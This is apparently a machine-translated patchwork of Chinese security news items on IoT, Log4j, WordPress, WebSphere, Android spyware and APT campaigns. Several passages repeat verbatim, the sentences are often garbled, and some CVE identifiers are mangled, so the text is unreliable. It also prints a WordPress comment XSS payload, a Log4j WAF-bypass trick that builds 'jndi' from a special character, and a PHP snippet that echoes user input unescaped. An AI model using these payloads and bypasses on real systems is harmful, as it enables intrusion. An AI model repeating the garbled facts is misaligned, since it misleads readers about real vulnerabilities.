2. Phattacks Another cybersecurity nightmare that has existed since the birth of the Internet is phishing attacks
Once you reply to a phishing email or follow its instructions, the information will be sent directly to its malicious source
Most people who use the Internet encounter phishing attacks tried at least once-after all, they usually appear in the form of spam-so only vigilance and caution can prevent you from becoming a victim of online spam
3. Botnet phishing is a popular technique for cybercriminals
Hackers use botnet attacks to perform distributed denial of service (DDoS) attacks, perform violent attacks, send spam messages, and steal personal information and sensitive data
The best way to guard against botnets is to ensure that your computer is not attacked by viruses and worms
It only requires a malicious email or download to infect your computer
Specifically, Buffer Errors accounts for 16.66%, and buffer related vulnerabilities exist in various operating systems and applications; denial of service, authority increase, code execution, etc
Incorrect access control accounts for 9.88%. attackers can improve permission, read sensitive information, code execution and evade verification through this type of vulnerability
Later, cross-site scripting attack (XSS), information leakage, input verification, and SQL injection accounted for 9.41%, 9.09%, 6.31% and 2.66% respectively

For example, several router security problems were exposed in May alone: two unfixed vulnerabilities in over million Korean Dasan routers; 0day vulnerability of DrayTek router was used to modify DNS Settings; vulnerabilities in TalkTalk router, user WiFi password exposed; D-Link DIR-620 router was exposed to backdoor accounts; more than 100 million IoT devices may be attacked by Z-Wave
Even router security has risen to national security, with Russian state hackers being accused of blocking 500,000 routers to attack Ukraine
1,360 code guard team code security laboratory IoT security researcher pointed out that the attacker mainly through the default password / password guess, unauthorized access, command injection and buffer overflow on the Internet to the Web remote management interface, telnet, UPnP and tr 069 services launched remote attack, in order to obtain complete control of the device
For the router attack of the Innetwork, the steps include: 1) the attacker sends the URL with execution code to the attacker; 2) if the attacker clicks on the URL, the URL will be redirected to the management address of the unwired device; 3) the attack code in the URL is executed in the unwired device, which can download Trojan horse, open shell, password sniffing and other operations
The security researcher said, Internet of Things devices that are exposed to the Internet always run day and night, just like servers, And the owners of the device rarely care about its safety, So once these devices have known or unknown vulnerabilities, Profitable attackers will use cyberspace search engines such as Shodan, Zoomeye, Censys to search for a large number of devices with the same vulnerability gene, And through the attack code to achieve such as tampering with the configuration information (DNS configuration, ACL configuration, etc.) to achieve traffic sniffing, middleman attack and phishing and other malicious behavior, Or insert backdoor programs and Trojan horse programs to provide mining services for the attackers, Or build a large botnet to conduct DDoS attacks on specific organizations, businesses and countries to maximize the benefits
3. It is time to care about the security of the devices of the Internet of Things in addition to PC and mobile terminals. The Internet of Things device has become an important infrastructure for individuals, enterprises and even countries, and its security is self-evident
Normally, these devices should not be identified to attract the attention of attackers
While this does not mean that every identifiable device will automatically pose a threat, it does mean that these devices can be accessed from anywhere in the world via an IP protocol
Cisco has the most well-known CVE-178, where only four CVE have dates 2020 or 2021, and most of the other CVE should have been restored
In the case of a large number of devices exposed, enterprises must guarantee software and firmware updates for devices connected to Internet, which may cause damage and loss of sensitive data or middleman attacks
While general attacks are based on commercial competition, extortion and other malicious purposes, telecom fraud can cost at least $12 billion, a threat against even SIP-enabled VoIP devices

3928: " Apache Log4j2 high-risk vulnerability attack enterprise users as soon as possible to fix the 2021-12-10 Apache Log4j2 remote code execution vulnerability details are made public
Since the Apache Log4j2 remote code execution exploit does not require special configuration, and the attacker can exploit the vulnerability to execute the code remotely, so the enterprises applying Apache Log4j2 will face great harm and need to be fixed as soon as possible to avoid the harm caused by the vulnerability
Vulnerability Description: Apache Log4j2 is a Java-based logging tool, which rewrite the Log4j framework and introduces a lot of rich features. Apache log4j-2 is an upgraded version of Log4j. This logging framework is widely used in business system development to record log information
In most cases, the developer may write the error information caused by the user input into the log, and an attacker can use this feature to build a special data request package through the vulnerability, eventually triggering remote code execution
Cross-site scripting vulnerability (XSS) has been a classic Top 10 attack method of OWASP in recent years, and it is quite good to find XSS vulnerabilities in the wild, especially in some well-known network products
Recently, the US Target security team found a unique XSS vulnerability in SharePoint, an online Microsoft online service product, without any user interaction. The following is the sharing of the Target team
 However, it is SharePoints notification service that allows malicious attackers to exploit vulnerabilities discovered by the Target security team to inject malicious code into the victims browser by sending an email, automatically implementing XSS attacks without user interaction
The idea is to use the cache of a web browser to steal Wi-Fi passwords
When the client connects, dribble intercepts each HTTP request executed on the JavaScript page and injects malicious JavaScript code into the response
When the client is disconnected from the false access point and reconnects to the home router, the malicious JavaScript code activates, stealing the Wi-Fi password from the router and sending the password to the attacker

7012: " Network security researchers have found a new set of serious vulnerabilities in the Realtek RTL8170C Wi-Fi module that attackers can exploit to gain higher access on devices and hijack wireless communications
Successful attack will result in full control of the Wi-Fi module and potential root access on the operating system (Linux or Android) of the embedded device that uses the module
The survey was found in February, when analysis found similar weaknesses in the Realtek RTL8195A Wi-Fi module, the main one being the buffer overflow vulnerability (CVE-2020-9395), which allows attackers near the RTL8195 module to pass through the module without knowing the Wi-Fi network password
Similarly, the four-way handshake mechanism in the RTL8170C Wi-Fi module is vulnerable to two stack-based buffer overflow vulnerabilities (CVE-2020-20-27301 and CVE-2020-27-2302, CVSS score: 8.0) through which an attacker can remotely execute code on a WPA 2 client using this module
The researchers verified the PoC scenario of the vulnerability, posing as a legitimate access point and sending a malicious encryption group temporary key (GTK) to any client (aka the requester) connected to it via the WPA 2 protocol
Buffer overflow Buffer is a continuous area of computer memory that holds multiple instances of the same data type
More serious security vulnerabilities include the shock wave virus in August 2003, the openssl "Heartbleed" (Heart Blood drop) vulnerability reported in April 2014, and the glibc library ghost bug in January 2015

Among them, DDoS attack and Web application attack are two two prominent security threats facing the Internet today
From the point of view of attack means and attack purpose, the two are completely different, but they are often not independent of each other, but closely related. It can be simply considered that DDoS attack and Web application attack are in different links in the attack chain, and botnet (Botnet) is the "bridge" between the two
But many attackers are not just content with this. They often plant Botnet malicious programs and build their own army of botnets
The WebLogic XMLDecoder deserialization vulnerability (CVE-2017-10271) that erupted in October 2017 was exploited by hackers to spread infected zombie programs between Weblogic hosts for mining
For another example, IoT _ reaper, a botnet variant published in 2017, takes advantage of several vulnerabilities related to the Internet of Things to build botnets. One of them is the Goahead Web Server vulnerability of some webcam (CVE-2017-8221 to CVE-2017-82215), and an important function of IoT _ reaper botnet is DDoS attack

Then I looked at the patch, and sure enough, I regretted that I was going to find an RCE vulnerability and submit the XXE vulnerability together, because I was afraid of submitting the XXE official blocked the reverse serialized entrance, such as CVE-2020-4450, and directly blocked the reverse serialized entrance
WebSphere Analysis seems to be very little, talk about a few analysis, not like Weblogic production vulnerabilities, single is a high version sdk will intercept a lot of chain or connection available chain of the point, thought and rotten in hand, it is better to share, write down we found the process, actually important is not the XXE, but to XXE in the first half of this point
In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

Therefore, under the WordPress defense system, how to bypass Nonce, how to obtain the super administrator permission, if any operation can threaten the website security operation under the non-super administrator permission, is the main direction of WordPress security vulnerabilities
After we are familiar with WordPresss security mechanism, lets go back to this vulnerability
In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products

Among them, DDoS attack and Web application attack are two two prominent security threats facing the Internet today
From the point of view of attack means and attack purpose, the two are completely different, but they are often not independent of each other, but closely related. It can be simply considered that DDoS attack and Web application attack are in different links in the attack chain, and botnet (Botnet) is the "bridge" between the two
But many attackers are not just content with this. They often plant Botnet malicious programs and build their own army of botnets

In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

0x03 Vulnerability Analysis CVE-2020-1948 Remote code execution vulnerability principle is the code execution caused by the remote method to be dynamically called
The vulnerability trigger principle of Dubbo is the code execution caused by the method of dynamically calling external incoming objects inside the toStringBean class
The vulnerability trigger point of dubbo is different from fastjson. fastjson uses this chain to cause code execution because the setAutoCommit method uses the this.connect() method, and the connect() method can use the jndi method to load malicious classes to cause code execution
Recently, the Green Alliance Technology volt Shadow Lab has captured a number of phishing documents and related Trojan horse programs called "TBS TV_Qs.doc"
According to the analysis, this series of malicious files are all part of the recent cyber attack activities organized by the APT organization Kimsuky, and their direct target is likely to be the military experts responsible for the Korean Peninsula issue
2. Process analysis of the captured Kimsuky attack activities, the attack process starts with malicious documents, by accessing a specific url to download different anti-virus software countermeasures strategy, try to run the known Kimsuky Trojan program KimAPosT, and finally use the malicious code stored in the OneDrive network disk to execute specific attacks
As of April 27,2022, the Kimsuky attacker may have completed the main attack process, replacing the final attack code with a non-intrusion code that contains only the victim statistic function
4. Component analysis There are many functional vbs scripts, bat scripts and other attack components appearing in this Kimsuky targeted attack activity
After the macro code runs, the document first tries to get and open the content in the remote link TV_Qs.docx, a decoy document used to deceive the victim

In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020
In addition, the researchers identified another set of 11 vulnerabilities (CVE-2020-28352 to CVE-2020-28359 and CVE-2020-28410-2020-2820-28412) that could lead to access denial, information leakage, data manipulation attacks, and even arbitrary code execution

Security experts in the Netherlands have found that problems with internal storage (laptops, tablets, and computers) and external storage (via USB connection) on Macs, Linux, and Windows systems can bypass existing encryption mechanisms to access data even without knowing the users password
The first (CVE-2018-12037) is related to no encryption binding between the password provided by the end user and the encryption key used to encrypt the users data
Therefore, the confidentiality of user data does not depend on the encryption mechanism and can be recovered by an attacker executing the code on the drive controller (via e. g., JTAG, memory corruption, memory chip content manipulation, and fault injection)

Among them, DDoS attack and Web application attack are two two prominent security threats facing the Internet today
From the point of view of attack means and attack purpose, the two are completely different, but they are often not independent of each other, but closely related. It can be simply considered that DDoS attack and Web application attack are in different links in the attack chain, and botnet (Botnet) is the "bridge" between the two
But many attackers are not just content with this. They often plant Botnet malicious programs and build their own army of botnets

In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory
The deserialization entrance is not given for the time being, and there may be many such deserialization entrance, and we happen to meet one of them. If we are lucky enough to find the RCE vulnerability, write out the entrance we found, and start with JNDI in that readObject

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

Folders with Everyone Full Control privileges are very interesting, but sometimes we struggle and may end up with nothing
We found that the permissions of the NSI directory are shown in the figure below, and these are consistent with the permissions of the Outbox directory: We then tried to use the James Forshaws symboliclink-testing-tools tool to redirect the directory to another location, create a mount point for another directory, and determine whether these files would be successfully written, which proved true
Here we may also have the option to use the junction tool in systernals
The James Forshaw toolset can help us make use of the existing directory, as shown in the figure below: Another tool can also be used in this attack scenario: Windowss own mklink.exe tool, but we need high permissions to use the tool, not suitable for the current scenario (now our purpose is to increase permissions)

11295: " Author: LoRexxar@ Know Chuangyu 404 Laboratory On March 13,2019, the RIPS team published an article about the WordPress 5.1.1 XSS vulnerability details, called wordpress csrf to rce, about WordPress protection early on October 25,2017, I once wrote an article about the WordPress security mechanism
Therefore, under the WordPress defense system, how to bypass Nonce, how to obtain the super administrator permission, if any operation can threaten the website security operation under the non-super administrator permission, is the main direction of WordPress security vulnerabilities
After we are familiar with WordPresss security mechanism, lets go back to this vulnerability
In / wp-includes/formatting.php line 3025, the entire label is processed once, Without no additional escape, Plus it is done by stitching the double quotation symbols, So if we construct a comment as <a title= aa \ "onmouseover=alert () id= \" rel= 111> please click me and the property in the original please click me link are taken out, And then are wrapped in double quotes, <a title= \ "aa \" onmouseover=alert () id= \ "\" rel= 111> please click me malicious link is constructed, When the administrator places the mouse on this comment, Any JS can be performed
Core set a security standard by saying that there is only one part of the vulnerability that can actually count as a vulnerability, a WordPress XSS vulnerability that bypassed the Nonce mechanism
But in the meantime, recent spyware on Google Play has done considerable damage to fans of the wonderful World Cup
"Golden Cup" is a malicious application that would install spyware on a victims device
Captured data Golden Cup Capture large amounts of encrypted data from the victims device: Phone number installed package device model, manufacturer, internal storage capacity available with serial numbers available Device IDAndroid version IMEI, IMSI This spyware may only be in the first stage of greater infection activity because it has the ability to load a dex file from a remote source, the application connects to its control server and attempts to download, extract, and decrypt phase 2
Android/FoulGoal.A Check when the screen is on or closed and record it in its internal file scrn.txt, the strings "on" and "off" indicate that it is used to track the user viewing the screen: the communication channel between the device and the malicious server uses the message queue telemetry Transfer Protocol (MQTT) to send and receive commands
We believe that the malware authors use this AES encryption technology to upload all the information, which helps to avoid the detection of Google Bouncer and network detection products
11307: According to The Hacker News 2 on October 23, researchers have demonstrated a new type of PDF document attacks on the contents of the document, including replacing the payee, payment order or changing the terms of the contract
The attack technique is called a "shadow attack" by scholars at the Ruhr University of Bochum in Germany, and its main attack principle is the "view layer" concept, or different sets of content that overlap in PDF documents
Of the 29 PDF readers tested, 16 were vulnerable to shadow attacks- - -, including Adobe Acrobat, Foxit Reader, Perfect PDF, and Okular
The research team added that hiding and replacing are the most harmful variant attacks, as it can replace the content of the entire document
To test the attack, the researchers released two new open-source tools, PDF-Attacker and PDF-Detector
This shadow attack exploit was tracked and coded as CVE-2020-9592 and CVE-2020-9596, which Adobe addressed in an update released on May 12,2020
In addition, the researchers identified another set of 11 vulnerabilities (CVE-2020-28352 to CVE-2020-28359 and CVE-2020-28410-2020-2820-28412) that could lead to access denial, information leakage, data manipulation attacks, and even arbitrary code execution

Security experts in the Netherlands have found that problems with internal storage (laptops, tablets, and computers) and external storage (via USB connection) on Macs, Linux, and Windows systems can bypass existing encryption mechanisms to access data even without knowing the users password
The first (CVE-2018-12037) is related to no encryption binding between the password provided by the end user and the encryption key used to encrypt the users data
Therefore, the confidentiality of user data does not depend on the encryption mechanism and can be recovered by an attacker executing the code on the drive controller (via e. g., JTAG, memory corruption, memory chip content manipulation, and fault injection)

In order to be more familiar with WebSphere, we also went to the historical patch. For example, the deep impression is CVE-2020-4276, which is the historical vulnerability CVE-2015-7450, and the process of RCE is no different from CVE-2015-7450
Later accidentally find another deserialization entry, Having confirming that it is impossible to focus on the historical loophole, Had to go from readObject, readExternal, toString, compare, etc., the functions to try to find, Later in a readObject found a JNDI injection, But due to the sdk high version, The only way you can be local factory or jndi local deserialization, But the WebSpheres public utilization chains are blocked, Local deserialization doesnt really work here, So all we left is the local Factory

One is to study what methods can be used besides jndi; the second is to find what methods can divide payload features besides lower, upper, etc
Back to the two questions just now, first, study which other lookup can be used except jndi. In fact, only jndi can be used by injection, but other methods will still lead to some information leakage, such as main, env, sys and other methods
The second question is to study which lookup methods can be used to segment commands. The first thought is to combine the splicing of empty characters
One is that the case conversion is not necessarily the letters, After the next character will not report an error, If $ {lower::} and: is an output, $ {power: /} and / is also an output; The second is that some special characters become just like normal letters after passing through the loop or the upper, Those who have ctf experience should be familiar with this, For example, jnd ? (? (here \ \ u0131) is not the lowercase letter i (\ \ x69)), A special character passes up and becomes JNDI, Using these features can also bypass the preprocessing and interception of some waf rules

One of the biggest problems facing the Internet of Things at this stage is malicious cryptocurrency mining, attacks such as DDoS attacks and botnet activities are becoming increasingly common, and the security of the Internet of Things is being challenged
What is shocking is that using brute force to guess that the password is the most common attack method for criminals, accounting for 93% of the hacker attack methods used, and the router is the most commonly used type of device to attack the Internet of Things gateway 
David Amm, a Kaspersky security officer, said, " This study should be a wake-up call for those who believe that Internet of Things devices seem insufficient to attract the attention of cyber criminals and will not be a target for malicious activity
However, other motives for attacking IoT devices include aiming to shut down competing malware, fixing vulnerabilities in installed malware and closing vulnerable services on the device so that other malware cannot use security vulnerabilities
As a result, ioT products have become an easy target for cybercriminals, who can turn simple machines into powerful devices for illegal activities, such as espionage, theft, extortion, and distributed (DDoS) attacks

3250: Ransomware is still one of the biggest methods of cybercrime and one of the biggest threats faced by businesses today
Ransomware is a specific type of malware, and its data is the most valuable resource for an organization
In recent years, it has become a common threat, as networks are increasingly exposed to additional vulnerabilities in the form of mobile and Internet of Things (IoT) devices, as well as improved phishing and social engineering technologies
Unlike other threats, ransomware can indicate its identity to the victim
If cryptocurrencies as a whole, attackers could be more likely to return for ransom than mining
Even if encryption is always more lucrative than ransomware, that doesnt mean that ransomware will disappear
Malicious attackers often use multiple threats to the victim to see how the victim is vulnerable
To defend against ransomware, companies need to be particularly vigilant about upgrades, updating and maintaining their threat detection technology
3255: " Security personnel recently discovered a new side channel attack against Intel processors, which is a serious security issue after the Meltdown, Spectre and Foreshadow
This vulnerability allows an attacker to obtain the data being processed by the current processor
This vulnerability was jointly found by some security personnel who participated in Meltdown and Spectre vulnerability research and Bitdefender security personnel. It was actually a microarchitecture data sampling (MDS) attack, and can infer other data processed in the processor by using the speculative execution operations in the microarchitecture
There are four types of these (MDS) attacks, namely attacks against storage buffer (CVE-2018-12126 / Fallout), loading buffer (CVE-2018-12127), row fill buffer (CVE-2018-12130 / Zombieload / RIDL), and memory area (CVE-2019-11091)

3354: Last week, six scientists from Ohio State University unveiled a new variant of the Spectre attack, SgxSpectre, which can extract data from the Intel SGX package
The Meltdown and Spectre attacks announced earlier this year in the year can cause attackers to break the isolation between the operating system and apps and within the app, causing malicious attackers to retrieve information from the operating system kernel or other apps
The researchers say the SgxSpectre attack worked because the specific code patterns present in the software library allow developers to add SGX support to their applications
The vulnerable SGX development packages include Intel SGX SDK, Rust-SGX as well as Graphene-SGX
It is typically a typical "side channel attack" and is very effective
Because there are vulnerable code patterns that are difficult to clear, the attacker can launch a SgxSpectre attack against any encapsulated program
"The research team also noted that," Due to the vulnerable code patterns in the SDK operating environment library, any code developed through the Intel official SGX SDK is affected by the attack, regardless of how the encapsulation program is executed
In addition to SgxSpectre, the researchers disclosed two variants of Meltdown and Spctre attacks, namely MeltdownPrime and SpectrePrime
The researchers are titled MeltdownPrime and SpectrePrime: Automated synthetic attacks using futility-based consistency protocols"

As can be seen from the blackmail letter, the attacker requires the target to contact it through the designated email address. If the target user does not cooperate with it, the encrypted documents and other information will be sold or published
Security experts said that because the current servers used by enterprises are mostly Linux system, the attacker can invade the server by any means and then encrypt files, so the probability of the attacker to get the ransom is higher, and the loss to the enterprise will be greater
At the same time, in view of the good support of Linux system platform for virtualization technology, with the continuous development of cloud computing platform in the future, extortion attacks against Linux system will be more violent, enterprise data will become the main target of ransomware attacks, there will be more ransomware targeted attacks similar to APT to maximize the benefits

3452: The vulnerability lets an attacker in Facebooks tapprd.legal.thefacebook. The com server (Server-Side) performs HTML code for remote code execution (RCE)
By this way, There are multiple ways to delegate to RCE: 1. Since there is another vulnerability in the Web application server, I can get the internal system path to the Web app through it, Then then extract the web.config file, To get more sensitive configuration information about Web applications; 2. After scanning for the internal network of the Web app, I found some of these WebLogic server systems that are internal-only; 3. After testing a different URL method, I found out that after using the "about: / /" format method, An IE page in the PDF file lists all the menu options and IE versions
Because Im not familiar with ASP.NET, but I wondered, did the Web app use some kind of Windows API interface on the HTML page in IE? And does that HTML page include a Javascript code for screenshots or document conversion, similar to the open source PDF document generation tool jsPDF? Under this assumption, I try to embed some Payload attack loads against IE (for confidentiality reasons, sorry not much detail here)
With the above three ways to implement RCE, the last step is how to execute the attack. Coincidentally, I found that there is a Facebook email forgery vulnerability in the Web application system, so the combination of the two can form the maximum power

The following is a GIF of Firefox IOS v10 scanning code to visit the website: construct XSS with javascript URI so, here how to find the vulnerability of its scanning code function? The first thing I think of is to construct a javascript URI form to replace the URL in the QR code, to see how to judge the scanning code function, and whether it will be executed as normal text or as javascript code
Local file loading process of XSS trigger can use the vulnerability to trigger some phone local file loading, scan code, there is a local file, file:///test.html, for example: inline page loading process XSS trigger in pseudo protocol internal: / / page loading process form XSS, such as: CSP bypass the vulnerability can also be used to bypass the CSP limit, such as a website limited to access to come from its own content, such as the following code scenario: / / test.php <?php header(\"Content-Security-Policy: default-src self\"); if(isset($_GET[xss])) { echo $_GET[xss]; } ?> So even with this limitation, the QR code javascript code we constructed can also run unlimited
In addition to Firefox, Opera mini for IOS also has the XSS vulnerability, we have informed Opera officials, but they have not responded so far
After reporting it to the Firefox, they removed the javascript URI function from the address bar in time, and the vulnerability was also assigned to CVE-2019-17003

The threats to hackers, viruses, malware and data breaches arent disappearing ¡ª theyre evolving, and there are more ahead as we approach 2019
1 ransomware So far, ransomware has been a major threat to cyber security in the past few years
The ransomware controls the computer or computer network and bans its use by completely locking the end users (unless a ransom is paid)
By doing so, cyberattackers can easily extort dazzling money from their victims
But is it really as scary as you think? Whats more, the widespread adoption and use of cryptocurrencies and the Internet of Things (IoT) devices has made ransomware even more popular
2. Phattacks Another cybersecurity nightmare that has existed since the birth of the Internet is phishing attacks
Once you reply to a phishing email or follow its instructions, the information will be sent directly to its malicious source
Most people who use the Internet encounter phishing attacks tried at least once-after all, they usually appear in the form of spam-so only vigilance and caution can prevent you from becoming a victim of online spam
3. Botnet phishing is a popular technique for cybercriminals
Hackers use botnet attacks to perform distributed denial of service (DDoS) attacks, perform violent attacks, send spam messages, and steal personal information and sensitive data
The best way to guard against botnets is to ensure that your computer is not attacked by viruses and worms
It only requires a malicious email or download to infect your computer
Specifically, Buffer Errors accounts for 16.66%, and buffer related vulnerabilities exist in various operating systems and applications; denial of service, authority increase, code execution, etc
Incorrect access control accounts for 9.88%. attackers can improve permission, read sensitive information, code execution and evade verification through this type of vulnerability
Later, cross-site scripting attack (XSS), information leakage, input verification, and SQL injection accounted for 9.41%, 9.09%, 6.31% and 2.66% respectively

3778: The Team TP-Link fixes certain serious vulnerabilities affecting the Archer router CVE-2019-7405, causing a potential attacker to bypass the administrator password and remotely control devices controlled via the Telnet connection
Mr.Grzegorz Wypych, a researcher with the IBM X-Force Red team, said, " This server vulnerability could cause a remote attacker to control the router configuration through the LAN Telnet connection and connect to the file Transfer Protocol (FTP) over the LAN or wide area network
Then, " all processes running at that permission level will cause the attacker to run with administrator rights and take over the device
If placed on an enterprise network, the compromised router can become an entry point for an attacker and a jump point for reconnaissance and lateral movement skills

For example, several router security problems were exposed in May alone: two unfixed vulnerabilities in over million Korean Dasan routers; 0day vulnerability of DrayTek router was used to modify DNS Settings; vulnerabilities in TalkTalk router, user WiFi password exposed; D-Link DIR-620 router was exposed to backdoor accounts; more than 100 million IoT devices may be attacked by Z-Wave
Even router security has risen to national security, with Russian state hackers being accused of blocking 500,000 routers to attack Ukraine
1,360 code guard team code security laboratory IoT security researcher pointed out that the attacker mainly through the default password / password guess, unauthorized access, command injection and buffer overflow on the Internet to the Web remote management interface, telnet, UPnP and tr 069 services launched remote attack, in order to obtain complete control of the device
For the router attack of the Innetwork, the steps include: 1) the attacker sends the URL with execution code to the attacker; 2) if the attacker clicks on the URL, the URL will be redirected to the management address of the unwired device; 3) the attack code in the URL is executed in the unwired device, which can download Trojan horse, open shell, password sniffing and other operations
The security researcher said, Internet of Things devices that are exposed to the Internet always run day and night, just like servers, And the owners of the device rarely care about its safety, So once these devices have known or unknown vulnerabilities, Profitable attackers will use cyberspace search engines such as Shodan, Zoomeye, Censys to search for a large number of devices with the same vulnerability gene, And through the attack code to achieve such as tampering with the configuration information (DNS configuration, ACL configuration, etc.) to achieve traffic sniffing, middleman attack and phishing and other malicious behavior, Or insert backdoor programs and Trojan horse programs to provide mining services for the attackers, Or build a large botnet to conduct DDoS attacks on specific organizations, businesses and countries to maximize the benefits
3. It is time to care about the security of the devices of the Internet of Things in addition to PC and mobile terminals. The Internet of Things device has become an important infrastructure for individuals, enterprises and even countries, and its security is self-evident
Normally, these devices should not be identified to attract the attention of attackers
While this does not mean that every identifiable device will automatically pose a threat, it does mean that these devices can be accessed from anywhere in the world via an IP protocol
Cisco has the most well-known CVE-178, where only four CVE have dates 2020 or 2021, and most of the other CVE should have been restored
In the case of a large number of devices exposed, enterprises must guarantee software and firmware updates for devices connected to Internet, which may cause damage and loss of sensitive data or middleman attacks
While general attacks are based on commercial competition, extortion and other malicious purposes, telecom fraud can cost at least $12 billion, a threat against even SIP-enabled VoIP devices

